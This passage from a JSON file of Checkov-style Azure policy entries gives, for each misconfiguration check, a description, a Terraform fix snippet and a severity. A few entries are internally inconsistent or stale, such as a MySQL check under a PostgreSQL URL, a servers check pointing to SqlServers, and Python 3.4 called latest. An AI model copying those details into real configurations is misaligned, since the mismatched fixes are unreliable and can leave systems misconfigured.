        "description": "UDP Services are not restricted from the Internet\nDescription\nDisable Internet exposed UDP ports on network security groups. The potential security problem with broadly exposing UDP services over the Internet is that attackers can use DDoS amplification techniques to reflect spoofed UDP traffic from Azure Virtual Machines. The most common types of these attacks use exposed DNS, NTP, SSDP, SNMP, CLDAP and other UDP-based services as amplification source for disrupting services of other machines on the Azure Virtual Network or even attack networked devices outside of Azure.\nFix - Buildtime \nTerraform\n\nResource: azurerm_network_security_group\nArgument:  protocol\n\nGoresource \"azurerm_network_security_group\" \"example\" {\n\n              security_rule {\n                name                       = \"test123\"\n                priority                   = 100\n                direction                  = \"Inbound\"\n+               access                     = \"Deny\"\n+               protocol                   = \"Udp\"\n                source_port_range          = \"*\"\n                destination_port_range     = \"*\"\n                source_address_prefix      = \"*\"\n                destination_address_prefix = \"*\"\n              }\n                                ...\n            }\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_78": {
        "url": "https://docs.bridgecrew.io/docs/ensure-ftp-deployments-are-disabled",
        "description": "Azure App Services FTP deployment is All allowed\nDescription\nFTPS (Secure FTP) is used to enhance security for Azure web application using App Service as it adds an extra layer of security to the FTP protocol, and help you to comply with the industry standards and regulations. For enhanced security, it is highly advices to use FTP over TLS/SSL only. You can also disable both FTP and FTPS if you don't use FTP deployment.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: ftps_state - (Optional) State of FTP / FTPS service for this App Service. Possible values include: AllAllowed, FtpsOnly and Disabled.\n\nGoresource \"azurerm_app_service\" \"example\" {\n  ...\n+ ftps_state = \"FtpsOnly\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_79": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-sql-servers-on-machines",
        "description": "Azure Defender is set to Off for SQL servers on machines\nDescription\nAzure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). \nAzure Defender for SQL servers on machines extends the protections for your Azure-native SQL Servers to fully support hybrid environments and protect SQL servers (all supported version) hosted in Azure.\nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: resource_type - (Required) The resource type this setting affects. Ensure that SqlServers and SqlServerVirtualMachines are declared to pass this check.\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n  tier          = \"Standard\"\n  resource_type = \"AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_72": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-remote-debugging-is-not-enabled-for-app-services",
        "description": "Remote debugging is enabled for app services\nDescription\nRemote debugging allows you to remotely connect to a running app and debug it from a different location. While this can be useful for developers who need to troubleshoot issues with their app, it also introduces a potential security risk because it allows someone to remotely access your app and potentially modify its code or behavior.\nIf remote debugging is enabled for your app services, it could potentially be exploited by an attacker to gain unauthorized access to your app and potentially compromise it. This could result in data loss, financial damage, or other negative consequences.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: remote_debugging_enabled\n\nGoresource \"azurerm_app_service\" \"example\" {\n                   ...\n+                  remote_debugging_enabled = false\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_85": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-kubernetes",
        "description": "Azure Security Center Defender is set to Off for Kubernetes\nDescription\nAzure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded).\nAzure Defender for Kubernetes provides cluster-level threat protection by monitoring your AKS-managed services through the logs retrieved by Azure Kubernetes Service (AKS).\nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: resource_type - (Required) The resource type this setting affects. Ensure that KubernetesService is declared to pass this check.\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n  tier          = \"Standard\"\n  resource_type = \"AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_86": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-container-registries",
        "description": "Azure Defender is set to Off for container registries\nDescription\nAzure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded).\nAzure Defender for container registries includes a vulnerability scanner to scan the images in Azure Resource Manager-based Azure Container Registry registries and provide deeper visibility image vulnerabilities. \nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: resource_type - (Required) The resource type this setting affects. Ensure that ContainerRegistry is declared to pass this check.\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n  tier          = \"Standard\"\n  resource_type = \"AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_87": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-key-vault",
        "description": "Azure Security Center Defender set to Off for Key Vault\nDescription\nAzure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded).\nAzure Defender detects unusual and potentially harmful attempts to access or exploit Key Vault accounts. \nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: resource_type - (Required) The resource type this setting affects. Ensure that KeyVaults is declared to pass this check.\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n  tier          = \"Standard\"\n  resource_type = \"AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_92": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-virtual-machines-use-managed-disks",
        "description": "Azure Virtual Machines are not utilizing managed disks\nDescription\nUsing Azure Managed disk over traditional BLOB based VHD's has more advantage features like Managed disks are by default encrypted, reduces cost over storage accounts and more resilient as Microsoft will manage the disk storage and move around if underlying hardware goes faulty. It is recommended to move BLOB based VHD's to Managed Disks.\nFix - Runtime\nIn Azure CLI\n\nLog in to the Azure Portal\nSelect 'Virtual Machines' from the left pane\nSelect the reported virtual machine\nSelect 'Disks' under 'Settings'\nClick on 'Migrate to managed disks'\nSelect 'Migrate'\", \"remediable\": false,\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_windows_virtual_machine\nArgument: storage_os_disk\n\nGoresource \"azurerm_windows_virtual_machine\" \"example\" {\n  ...\n  + storage_os_disk {\n    name              = \"myosdisk1\"\n    caching           = \"ReadWrite\"\n    create_option     = \"FromImage\"\n    managed_disk_type = \"Standard_LRS\"\n  }\n  ...\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_95": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-automatic-os-image-patching-is-enabled-for-virtual-machine-scale-sets",
        "description": "Automatic OS image patching is disabled for Virtual Machine scale sets\nDescription\nThis policy enforces enabling automatic OS image patching on Virtual Machine Scale Sets to always keep Virtual Machines secure by safely applying latest security patches every month.\nFix - Buildtime \nTerraform\n\nResource: azurerm_virtual_machine_scale_set\nArgument: automatic_os_upgrade\n\nGoresource \"azurerm_virtual_machine_scale_set\" \"example\" {\n          ...\n +        automatic_os_upgrade = true\n          ...\n        }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_96": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-infrastructure-encryption-1",
        "description": "MySQL server disables infrastructure encryption\nDescription\nEnable infrastructure encryption for Azure Database for MySQL servers to have higher level of assurance that the data is secure. When infrastructure encryption is enabled, the data at rest is encrypted twice using FIPS 140-2 compliant Microsoft managed keys.\nFix - Buildtime \nTerraform\n\nResource: azurerm_mysql_server\nArgument: infrastructure_encryption_enabled\n\nGoresource \"azurerm_mysql_server\" \"example\" {\n  ...\n+ infrastructure_encryption_enabled = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_98": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-container-container-group-is-deployed-into-virtual-network",
        "description": "Azure container container group is not deployed into a virtual network\nDescription\nA virtual network is a logical network in Azure that is isolated from other networks. When you deploy a container group into a virtual network, you can control the inbound and outbound network traffic to and from your container group using network security groups (NSGs) and service endpoints. This can help to improve the security of your container group and protect it from unauthorized access or attacks.\nFix - Buildtime \nTerraform\n\nResource: azurerm_container_group\nArgument: network_profile_id\n\nGoresource \"azurerm_container_group\" \"example\" {\n              ...\n              \n  +           network_profile_id = \"network_profile_id\"    \n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_99": {
        "url": "https://docs.bridgecrew.io/docs/ensure-cosmos-db-accounts-have-restricted-access",
        "description": "Cosmos DB accounts do not have restricted access\nDescription\nCosmos DB is a globally distributed database service that provides multiple ways to secure and protect your data, such as network isolation, virtual networks, Azure Private Link, and Azure AD authentication. By restricting access to your Cosmos DB account, you can control who can access your database and what actions they can perform on it.\nBy ensuring that your Cosmos DB accounts have restricted access, you can help to improve the security of your database and protect it from unauthorized access or attacks. This can help to ensure that your database is secure and available for your users.\nFix - Buildtime \nTerraform\n\nResource: azurerm_cosmosdb_account\nArgument:public_network_access_enabled\n\nGoresource \"azurerm_cosmosdb_account\" \"db\" {\n              ...\n +            public_network_access_enabled = false\n              ...\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_100": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-cosmos-db-accounts-have-customer-managed-keys-to-encrypt-data-at-rest",
        "description": "Cosmos DB Accounts do not have customer-managed keys encrypting data at rest\nDescription\nData stored in Azure Cosmos account is automatically encrypted with keys managed by Microsoft (service-managed keys). Customer-managed keys (CMKs) give users total control over the keys used by Azure Cosmos DB to encrypt their data at rest. Built as an additional encryption layer on top of the Azure Cosmos DB default encryption at rest with service managed keys, it uses Azure Key Vault to store encryption keys and provides a way to implement double encryption.\nFix - Buildtime \nTerraform\n\nResource: azurerm_cosmosdb_account\nArgument: key_vault_key_id - (Optional) A versionless Key Vault Key ID for CMK encryption. Changing this forces a new resource to be created.\n\nGoresource \"azurerm_cosmosdb_account\" \"db\" {\n  name                = \"tfex-cosmos-db-${random_integer.ri.result}\"\n  location            = azurerm_resource_group.rg.location\n  resource_group_name = azurerm_resource_group.rg.name\n  offer_type          = \"Standard\"\n  kind                = \"GlobalDocumentDB\"\n\n  enable_automatic_failover = true\n\n  capabilities {\n    name = \"EnableAggregationPipeline\"\n  }\n\n  capabilities {\n    name = \"mongoEnableDocLevelTTL\"\n  }\n\n  capabilities {\n    name = \"MongoDBv3.4\"\n  }\n\n  consistency_policy {\n    consistency_level       = \"BoundedStaleness\"\n    max_interval_in_seconds = 10\n    max_staleness_prefix    = 200\n  }\n\n  geo_location {\n    location          = var.failover_location\n    failover_priority = 1\n  }\n\n  geo_location {\n    location          = azurerm_resource_group.rg.location\n    failover_priority = 0\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_110": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-key-vault-enables-purge-protection",
        "description": "Key vault disables purge protection\nDescription\nPurge protection is an optional Key Vault behavior and is not enabled by default. Purge protection can only be enabled once soft-delete is enabled. It can be turned on via CLI or PowerShell. When purge protection is on, a vault or an object in the deleted state cannot be purged until the retention period has passed. Soft-deleted vaults and objects can still be recovered, ensuring that the retention policy will be followed. The default retention period is 90 days, but it is possible to set the retention policy interval to a value from 7 to 90 days through the Azure portal. Once the retention policy interval is set and saved it cannot be changed for that vault.\nFix - Buildtime \nTerraform\n\nResource: azurerm_key_vault\nArgument: purge_protection_enabled - (Optional) Is Purge Protection enabled for this Key Vault? Defaults to false.\n\nGoresource \"azurerm_key_vault\" \"example\" {\n        ...\n+  purge_protection_enabled    = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_115": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-aks-enables-private-clusters",
        "description": "AKS is not enabled for private clusters\nDescription\nEnable the private cluster feature for your Azure Kubernetes Service cluster to ensure network traffic between your API server and your node pools remains on the private network only. This is a common requirement in many regulatory and industry compliance standards.\nFix - Buildtime \nTerraform\n\nResource: azurerm_kubernetes_cluster\nArgument: private_cluster_enabled\n\nGoresource \"azurerm_kubernetes_cluster\" \"example\" {\n                  ...\n  +               private_cluster_enabled = true\n                  \n                }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_118": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-network-interfaces-disable-ip-forwarding",
        "description": "Azure virtual machine NIC has IP forwarding enabled\nDescription\nBy disabling IP forwarding on the NIC of your Azure virtual machine, you can help to prevent the virtual machine from acting as a router and forwarding traffic to unintended destinations. This can help to improve the security of your virtual machine and protect it from potential threats such as man-in-the-middle attacks or data breaches.\nFix - Buildtime \nTerraform\n\nResource:azurerm_network_interface\nArgument: enable_ip_forwarding\n\nGoresource \"azurerm_network_interface\" \"example\" {\n                  ...\n +                enable_ip_forwarding = false\n                }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_121": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-front-door-enables-waf",
        "description": "Azure front door does not have WAF enabled\nDescription\nWAF is a security feature that provides protection for web applications by inspecting incoming traffic and blocking malicious requests before they reach the application. When WAF is enabled on an Azure Front Door, it analyzes incoming traffic to the front door and blocks requests that are determined to be malicious based on a set of rules. This can help to protect your application from a variety of threats, such as SQL injection attacks, cross-site scripting (XSS) attacks, and other types of attacks.\nFix - Buildtime \nTerraform\n\nResource: azurerm_frontdoor\nArgument: web_application_firewall_policy_link_id\n\nGoresource \"azurerm_frontdoor\" \"example\" {\n              ...\n+             web_application_firewall_policy_link_id = \"this_is_id\"\n              ...\n            }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_127": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-my-sql-server-enables-threat-detection-policy",
        "description": "My SQL server does not enable Threat Detection policy\nDescription\nEnable Advanced Threat Detection on your non-Basic tier Azure database for MySQL servers to detect anomalous activities indicating unusual and potentially harmful attempts to access or exploit databases.\nFix - Buildtime \nTerraform\n\nResource: azurerm_mysql_server\nArgument: threat_detection_policy.enabled\n\nGoresource \"azurerm_mysql_server\" \"example\" {\n              ... \n+             threat_detection_policy {\n+                 enabled = true\n              }\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_128": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-threat-detection-policy",
        "description": "PostgreSQL server does not enable Threat Detection policy\nDescription\nEnable Advanced Threat Detection on your non-Basic tier Azure database for PostgreSQL servers to detect anomalous activities indicating unusual and potentially harmful attempts to access or exploit databases.\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_server\nArgument:threat_detection_policy.enabled\n\nGoresource \"azurerm_postgresql_server\" \"example\" {\n              ...\n+             threat_detection_policy {\n+                 enabled = true\n              }\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_129": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-mariadb-server-enables-geo-redundant-backups",
        "description": "MariaDB server does not enable geo-redundant backups\nDescription\nEnsure that your Microsoft Azure MariaDB database servers have geo-redundant backups enabled, to allow you to restore your MariaDB servers to a different Azure region in the event of a regional outage or a disaster.\nGeo-restore is the default recovery option when your MariaDB database server is unavailable because of a large-scale incident, such as a natural disaster, occurs in the region where the database server is hosted. .During geo-restore, the MariaDB server configuration can be changed. These configuration changes include compute generation, vCore, backup retention period and backup redundancy options.\nFix - Runtime\nIn Azure console\n\nSign in to Azure Management Console.\nNavigate to All resources blade at https://portal.azure.com/#blade/HubsExtension/BrowseAll to access all your Microsoft Azure resources.\nFrom the Type filter box, select Azure Database for MariaDB server to list the MariaDB servers provisioned within your Azure account.\nClick on the name of the MariaDB database server that you want to examine.\nIn the navigation panel, under Settings, select Pricing tier to access the pricing tier settings available for the selected MariaDB server.\nOn the Pricing tier page, in the Backup Redundancy Options section, check the backup redundancy tier configured for the database server. If the selected tier is Locally Redundant, the data can be recovered from within the current region only, therefore the Geo-Redundant backup feature is not enabled for the selected Microsoft Azure MariaDB database server.\nRepeat steps no. 4 \u2013 6 for each MariaDB database server available in the current Azure subscription.\nRepeat steps no. 3 \u2013 7 for each subscription created in your Microsoft Azure cloud account.\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_mariadb_server\nArgument: geo_redundant_backup_enabled \n\nGoresource \"azurerm_mariadb_server\" \"example\" {\n            ...\n+           geo_redundant_backup_enabled  = true\n        }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_103": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-data-factory-uses-git-repository-for-source-control",
        "description": "Azure Data Factory does not use Git repository for source control\nDescription\nAzure Data Factory is an ETL service for  serverless data integration and data transformation. Azure Data Factory allows you to configure a Git repository with either Azure Repos or GitHub. Git is a version control system that allows for easier change tracking and collaboration.\nFix - Buildtime \nTerraform\n\nResource: azurerm_data_factory\nArgument: github_configuration - (Optional) A github_configuration block as defined below.\n\nGoresource \"azurerm_data_factory\" \"example\" {\n  ....\n    github_configuration {\n    account_name    = \"${var.account_name}\"\n    branch_name     = \"${var.branch_name}\"\n    git_url         = \"${var.git_url}\"\n    repository_name = \"${var.repository_name}\"\n    root_folder     = \"${var.root_folder}\"\n  }\n\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_104": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-data-factory-public-network-access-is-disabled",
        "description": "Azure Data Factory (V2) configured with overly permissive network access\nDescription\nBy ensuring that your Azure Data factory is not public, you can help protect your data from unauthorized access or tampering. Public Azure Data factory instances are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\n\nResource: azurerm_data_factory\nArgument: public_network_enabled\n\nGoresource \"azurerm_data_factory\" \"example\" {\n              ...\n+             public_network_enabled = false\n            }\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_55": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-servers",
        "description": "Azure Security Center Defender is set to Off for servers\nDescription\nAzure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). \nAzure Defender for servers adds threat detection and advanced defenses for Windows and Linux machines.\nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: resource_type - (Required) The resource type this setting affects. Ensure that SqlServers is declared to pass this check.\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n  tier          = \"Standard\"\n  resource_type = \"AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_56": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-function-apps-enables-authentication",
        "description": "Azure function app authentication is off\nDescription\nAzure App Service Authentication is a feature that can prevent anonymous HTTP requests from reaching the Function app, or authenticate those that have tokens before they reach the Function app.\nFix - Buildtime \nTerraform\n\nResource: azurerm_function_app\nArgument: auth_settings.enabled\n\nGoresource \"azurerm_function_app\" \"example\" {\n              ...\n +            auth_settings {\n +              enabled = true\n              }\n            }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_57": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-cors-disallows-every-resource-to-access-app-services",
        "description": "CORS allows resource to access app services\nDescription\nCross-Origin Resource Sharing (CORS) should not allow all domains to access your web application. Allow only required domains to interact with your web app.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: cors \n\nGoresource \"azurerm_app_service\" \"example\" {\n                 ...                        \n                site_config {\n+             cors {\n+                    allowed_origins = [\"192.0.0.1\"]\n+                                   }\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_58": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-synapse-workspaces-enables-managed-virtual-networks",
        "description": "Azure Synapse Workspaces do not enable managed virtual networks\nDescription\nEnabling managed virtual networks in Azure Synapse Workspaces can help to improve security and isolation for your data and workloads. By using a managed virtual network, you can control access to your data and resources by defining network security rules and configuring network routing. Managed virtual networks can also help to improve the performance of your data and analytics workloads by reducing network latency and optimizing network traffic.\nFix - Buildtime \nTerraform\n\nResource: azurerm_synapse_workspace\nArgument: managed_virtual_network_enabled\n\nGoresource \"azurerm_synapse_workspace\" \"example\" {\n                            ...\n+             managed_virtual_network_enabled      = true                \n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_59": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-storage-accounts-disallow-public-access",
        "description": "Ensure that Storage accounts disallow public access\nDescription\nAs a best practice, do not allow anonymous/public access to storage accounts unless you have a very good reason. The all networks option includes the internet.\nFix - Runtime\nIn Azure Console\n\nLog in to the Azure portal\nNavigate to 'Storage Accounts'\nSelect the reported storage account\nUnder 'Security + networking section' section, Select 'Networking'\nUnder Firewall and virtual networks\nClick on 'Change access level'\nSet 'Public networks access' to 'anything but 'Enabled from all networks'\nClick on Save'\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_storage_account\nArgument: public_network_access_enabled\n\nazurerm_storage_account.pike.tfresource \"azurerm_storage_account\" \"pike\" {\n              ...\n+             public_network_access_enabled = false\n              ...\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_61": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-app-service",
        "description": "Azure Security Center Defender is set to Off for app service\nDescription\nAzure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). \nAzure Defender for App Service detects attacks targeting applications running over App Service. \nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: resource_type - (Required) The resource type this setting affects. Ensure that AppServices is declared to pass this check.\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n  tier          = \"Standard\"\n  resource_type = \"AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_62": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-cors-disallows-every-resource-to-access-function-apps",
        "description": "CORS allows resources to access function apps\nDescription\nCross-Origin Resource Sharing (CORS) should not allow all domains to access your Function app. Allow only required domains to interact with your Function app.\nFix - Buildtime \nTerraform\n\nResource: azurerm_function_app\nArgument: site_config.cors\n\nGoresource \"azurerm_function_app\" \"example\" {\n                ...\n                site_config {\n+                 cors {\n+                     allowed_origins = [\"192.0.0.1\"]\n                  }\n                }\n              }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_64": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-file-sync-disables-public-network-access",
        "description": "Azure file sync enables public network access\nDescription\nBy ensuring that your Azure file sync is not public, you can help protect your data from unauthorized access or tampering. Public Azure file sync are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\n\nResource: azurerm_storage_sync\nArgument: incoming_traffic_policy\n\nGoresource \"azurerm_storage_sync\" \"test\" {\n                            ...\n+             incoming_traffic_policy = AllowVirtualNetworksOnly\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_65": {
        "url": "https://docs.bridgecrew.io/docs/tbdensure-that-app-service-enables-detailed-error-messages",
        "description": "App service disables detailed error messages\nDescription\nDetailed error messages provide more information about an error that occurs in your app, such as the error code, the line of code where the error occurred, and a description of the error. This information can be very useful for debugging issues with your app and identifying the root cause of the problem.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: detailed_error_messages_enabled\n\nGoresource \"azurerm_app_service\" \"example\" {\n             ...\n+            logs {\n+               detailed_error_messages_enabled = true\n+            }\n             ...\n    }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_66": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-app-service-enables-failed-request-tracing",
        "description": "App service does not enable failed request tracing\nDescription\nBy enabling failed request tracing for your app service, you can collect this information and use it to troubleshoot issues with your app and identify potential problems. This can help to ensure that your app is running smoothly and is able to handle any errors that might occur.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: logs.failed_request_tracing_enabled\n\nGoresource \"azurerm_app_service\" \"example\" {\n             ...\n  +           logs {\n  +             failed_request_tracing_enabled = true\n                }\n             ...\n              }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_67": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-http-version-is-the-latest-if-used-to-run-the-function-app",
        "description": "Azure function app does not use HTTP 2.0\nDescription\nThis policy identifies Azure Function App which doesn't use HTTP 2.0. HTTP 2.0 has additional performance improvements on the head-of-line blocking problem of old HTTP version, header compression, and prioritisation of requests. HTTP 2.0 no longer supports HTTP 1.1's chunked transfer encoding mechanism, as it provides its own, more efficient, mechanisms for data streaming.\nFix - Runtime\nIn Azure Console\n\nLog in to the Azure portal\nNavigate to Function App\nClick on the reported Function App\nUnder Setting section, Click on 'Configuration'\nUnder 'General Settings' tab, In 'Platform settings', Set 'HTTP version' to '2.0'\nClick on 'Save'. \n\nIn Azure CLI\nIf Function App Hosted in Linux using Consumption (Serverless) Plan follow below steps Azure CLI Command\nText- az functionapp config set --http20-enable true --name MyFunctionApp --resource-group MyResourceGroup\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_function_app\nArgument: site_config.http2_enabled\n\nGoresource \"azurerm_function_app\" \"example\" {\n           ...\n+          site_config {\n+          http2_enabled = true\n          }\n        }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_80": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-net-framework-version-is-the-latest-if-used-as-a-part-of-the-web-app",
        "description": "Azure App Service Web app doesn't use latest .Net framework version\nDescription\nAzure App Service web applications developed with the .NET software stack should use the latest available version of .NET to ensure the latest security fixes are in use.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: dotnet_framework_version - (Optional) The version of the .net framework's CLR used in this App Service. Possible values are v2.0 (which will use the latest version of the .net framework for the .net CLR v2 - currently .net 3.5), v4.0 (which corresponds to the latest version of the .net CLR v4 - which at the time of writing is .net 4.7.1) and v5.0.\n\nGoresource \"azurerm_app_service\" \"example\" {\n  ...\n  site_config {\n+   dotnet_framework_version = \"v4.0\"\n    ...\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_81": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-php-version-is-the-latest-if-used-to-run-the-web-app",
        "description": "Azure App Service Web app does not use the latest PHP version\nDescription\nAzure App Service web applications developed with the PHP should use the latest available version of PHP to ensure the latest security fixes are in use.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: php_version - (Optional) The version of PHP to use in this App Service. Possible values are 5.5, 5.6, 7.0, 7.1, 7.2, 7.3 and 7.4.\n\nGoresource \"azurerm_app_service\" \"example\" {\n  ...\n+  site_config {\n+    php_version = \"7.4\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_82": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-python-version-is-the-latest-if-used-to-run-the-web-app",
        "description": "Azure App Service Web app does not use the latest Python version \nDescription\nAzure App Service web applications developed with the Python should use the latest available version of Python to ensure the latest security fixes are in use.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: python_version - (Optional) The version of Python to use in this App Service. Possible values are 2.7 and 3.4.\n\nGoresource \"azurerm_app_service\" \"example\" {\n   ...\n+  site_config {\n+   python_version = \"3.4\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_83": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-java-version-is-the-latest-if-used-to-run-the-web-app",
        "description": "Azure App Service Web app does not use the latest Java version\nDescription\nAzure App Service web applications developed with the Java software stack should use the latest available version of Java to ensure the latest security fixes are in use.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: java_version - (Optional) The version of Java to use. If specified java_container and java_container_version must also be specified. Possible values are 1.7, 1.8 and 11 and their specific versions - except for Java 11 (e.g. 1.7.0_80, 1.8.0_181, 11)\n\nGoresource \"azurerm_app_service\" \"example\" {\n  ...\n  site_config {\n+   java_version = \"11\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_84": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-storage",
